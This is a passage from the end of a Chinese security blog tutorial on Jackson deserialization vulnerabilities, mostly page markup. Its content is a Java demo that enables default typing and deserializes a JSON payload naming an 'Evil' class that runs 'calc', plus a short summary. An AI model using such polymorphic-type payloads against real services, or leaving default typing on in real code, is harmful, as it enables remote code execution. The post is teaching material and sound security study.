+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationObjectRun</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;object\&quot;:[\&quot;com.drunkbaby.JacksonVul.Evil\&quot;,&#123;\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person4</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person4.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/calc2.png" class>
+
+<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>概念虽然多，但是自己跟一下代码，看起来还是非常快的。总而言之就是开启了特殊的反序列化解析方式时，会调用任意的构造函数与 setter 方法</p>
+<h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a class="link" target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86">http://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86<i class="fas fa-external-link-alt"></i></a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">Jackson 反序列化（一）漏洞原理</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2023-12-07 20:05:52</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2023/12/07/Jackson-反序列化（一）漏洞原理/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Java/"><i class="icon fas fa-hashtag"></i>Java</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item text-ellipsis">Jackson 反序列化（二）CVE-2017-7525</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item text-ellipsis">Java Agent 内存马学习</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                
+
+
+    <div class="comments-container">
+        <div id="comments-anchor"></div>
+        <div class="comment-area-title">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: '9Ky0YY6Ij33nFC4KZ2VcGh9k-MdYXbMMI',
+              appKey: 'qqN77H4k2Hxhg7ZJ88Lf0xxM',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('https://9Ky0YY6I.api.lncldglobal.com') {
+              config.serverURLs = 'https://9Ky0YY6I.api.lncldglobal.com'
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                case 'zh-TW':
+                  return '站長'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+            
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-text">0x01 Jackson 基本使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Jackson-%E7%AE%80%E4%BB%8B"><span class="nav-text">Jackson 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-Jackson-%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">使用 Jackson 进行序列化与反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Jackson-%E5%AF%B9%E4%BA%8E%E5%A4%9A%E6%80%81%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3-%E2%80%94%E2%80%94-JacksonPolymorphicDeserialization"><span class="nav-text">0x02 Jackson 对于多态问题的解决 —— JacksonPolymorphicDeserialization</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DefaultTyping"><span class="nav-text">DefaultTyping</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JAVA-LANG-OBJECT"><span class="nav-text">JAVA_LANG_OBJECT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OBJECT-AND-NON-CONCRETE"><span class="nav-text">OBJECT_AND_NON_CONCRETE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NON-CONCRETE-AND-ARRAYS"><span class="nav-text">NON_CONCRETE_AND_ARRAYS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NON-FINAL"><span class="nav-text">NON_FINAL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JsonTypeInfo-%E6%B3%A8%E8%A7%A3"><span class="nav-text">@JsonTypeInfo 注解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JsonTypeInfo-Id-NONE"><span class="nav-text">JsonTypeInfo.Id.NONE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JsonTypeInfo-Id-CLASS"><span class="nav-text">JsonTypeInfo.Id.CLASS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JsonTypeInfo-Id-MINIMAL-CLASS"><span class="nav-text">JsonTypeInfo.Id.MINIMAL_CLASS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JsonTypeInfo-Id-NAME"><span class="nav-text">JsonTypeInfo.Id.NAME</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JsonTypeInfo-Id-CUSTOM"><span class="nav-text">JsonTypeInfo.Id.CUSTOM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-1"><span class="nav-text">小结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%B1%BB%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8"><span class="nav-text">0x03 反序列化中类属性方法的调用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%93%E4%BD%BF%E7%94%A8-DefaultTyping-%E6%97%B6"><span class="nav-text">当使用 DefaultTyping 时</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%93%E4%BD%BF%E7%94%A8-JsonTypeInfo-%E6%B3%A8%E8%A7%A3%E6%97%B6"><span class="nav-text">当使用 @JsonTypeInfo 注解时</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-text">Jackson 反序列化调试分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E8%AE%BA"><span class="nav-text">结论</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">0x04 Jackson 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="nav-text">前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF%E5%8F%8A-Demo"><span class="nav-text">漏洞场景及 Demo</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E4%B8%8D%E4%B8%BAObject%E7%B1%BB%E6%97%B6"><span class="nav-text">属性不为Object类时</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E4%B8%BA-Object-%E7%B1%BB%E6%97%B6"><span class="nav-text">属性为 Object 类时</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x05 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Ref"><span class="nav-text">0x06 Ref</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2021</span>&nbsp;-&nbsp;2023
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Drunkbaby</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.7.3</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">访问人数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">总访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-text">0x01 Jackson 基本使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Jackson-%E7%AE%80%E4%BB%8B"><span class="nav-text">Jackson 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-Jackson-%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">使用 Jackson 进行序列化与反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Jackson-%E5%AF%B9%E4%BA%8E%E5%A4%9A%E6%80%81%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3-%E2%80%94%E2%80%94-JacksonPolymorphicDeserialization"><span class="nav-text">0x02 Jackson 对于多态问题的解决 —— JacksonPolymorphicDeserialization</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DefaultTyping"><span class="nav-text">DefaultTyping</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JAVA-LANG-OBJECT"><span class="nav-text">JAVA_LANG_OBJECT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OBJECT-AND-NON-CONCRETE"><span class="nav-text">OBJECT_AND_NON_CONCRETE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NON-CONCRETE-AND-ARRAYS"><span class="nav-text">NON_CONCRETE_AND_ARRAYS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NON-FINAL"><span class="nav-text">NON_FINAL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JsonTypeInfo-%E6%B3%A8%E8%A7%A3"><span class="nav-text">@JsonTypeInfo 注解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JsonTypeInfo-Id-NONE"><span class="nav-text">JsonTypeInfo.Id.NONE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JsonTypeInfo-Id-CLASS"><span class="nav-text">JsonTypeInfo.Id.CLASS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JsonTypeInfo-Id-MINIMAL-CLASS"><span class="nav-text">JsonTypeInfo.Id.MINIMAL_CLASS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JsonTypeInfo-Id-NAME"><span class="nav-text">JsonTypeInfo.Id.NAME</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JsonTypeInfo-Id-CUSTOM"><span class="nav-text">JsonTypeInfo.Id.CUSTOM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-1"><span class="nav-text">小结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%B1%BB%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8"><span class="nav-text">0x03 反序列化中类属性方法的调用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%93%E4%BD%BF%E7%94%A8-DefaultTyping-%E6%97%B6"><span class="nav-text">当使用 DefaultTyping 时</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%93%E4%BD%BF%E7%94%A8-JsonTypeInfo-%E6%B3%A8%E8%A7%A3%E6%97%B6"><span class="nav-text">当使用 @JsonTypeInfo 注解时</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-text">Jackson 反序列化调试分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E8%AE%BA"><span class="nav-text">结论</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">0x04 Jackson 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="nav-text">前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF%E5%8F%8A-Demo"><span class="nav-text">漏洞场景及 Demo</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E4%B8%8D%E4%B8%BAObject%E7%B1%BB%E6%97%B6"><span class="nav-text">属性不为Object类时</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E4%B8%BA-Object-%E7%B1%BB%E6%97%B6"><span class="nav-text">属性为 Object 类时</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x05 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Ref"><span class="nav-text">0x06 Ref</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/toc.js"></script>
+        
+    
+    
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.7.3/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
